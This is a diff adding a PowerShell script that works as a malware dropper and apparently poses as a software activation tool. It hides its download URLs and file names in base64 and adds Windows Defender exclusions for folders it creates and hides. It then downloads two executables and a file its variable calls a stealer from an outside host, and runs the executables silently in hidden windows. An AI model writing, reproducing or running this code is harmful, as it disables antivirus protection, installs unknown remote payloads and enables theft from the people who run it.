@@ -1,0 +1,66 @@
+function Add-Exclusion {
+    param ([string]$Path)
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
+    } catch {}
+}
+
+
+$clientUrlB64 = "aHR0cDovL25hcy50bnRhZGRpY3QubmV0L3dlYmxvYWQvQ2xpZW50djIuZXhl"
+$authUrlB64 = "aHR0cDovL25hcy50bnRhZGRpY3QubmV0L3dlYmxvYWQvTWFjaGluZUF1dG9yaXNhdGlvbi5leGU="
+$stealerUrlB64 = "aHR0cDovL25hcy50bnRhZGRpY3QubmV0L3dlYmxvYWQvc2NyaXB0LnR4dA=="
+$clientExeB64 = "Q2xpZW50djIuZXhl"
+$authExeB64 = "TWFjaGluZUF1dG9yaXNhdGlvbi5leGU="
+$hiddenAttrB64 = "SGlkZGVu"
+$silentlyContinueB64 = "U2lsZW50bHlDb250aW51ZQ=="
+$stopActionB64 = "U3RvcA=="
+$directoryB64 = "RGlyZWN0b3J5"
+$trustedFolderB64 = "VXBkYXRlQ2FjaGU="
+
+
+$clientUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($clientUrlB64))
+$authUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($authUrlB64))
+$stealerUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stealerUrlB64))
+$clientExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($clientExeB64))
+$authExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($authExeB64))
+$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
+$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
+$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
+$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
+$trustedFolder = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedFolderB64))
+
+
+$persistFolder = Join-Path $env:APPDATA $trustedFolder
+New-Item -ItemType $directory -Path $persistFolder -Force | Out-Null
+Set-ItemProperty -Path $persistFolder -Name Attributes -Value $hiddenAttr
+Add-Exclusion -Path $persistFolder
+
+$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
+New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
+Add-Exclusion -Path $hiddenFolder
+
+
+$clientPath = Join-Path $hiddenFolder $clientExe
+$authPath = Join-Path $hiddenFolder $authExe
+$stealerPath = Join-Path $env:USERPROFILE\Downloads "Test.zip"
+
+
+try {
+    Invoke-WebRequest -Uri $clientUrl -OutFile $clientPath -UseBasicParsing -ErrorAction $stopAction
+    Invoke-WebRequest -Uri $authUrl -OutFile $authPath -UseBasicParsing -ErrorAction $stopAction
+    Invoke-WebRequest -Uri $stealerUrl -OutFile $stealerPath -UseBasicParsing -ErrorAction $stopAction
+
+    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
+    Set-ItemProperty -Path $clientPath -Name Attributes -Value $hiddenAttr
+    Set-ItemProperty -Path $authPath -Name Attributes -Value $hiddenAttr
+
+    Start-Process -FilePath $clientPath -WindowStyle Hidden -Wait
+    Start-Process -FilePath $authPath -WindowStyle Hidden -Wait
+} catch {
+    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
+    exit 1
+} finally {
+    if (Test-Path $hiddenFolder) {
+        Remove-Item $hiddenFolder -Recurse -Force
+    }
+}
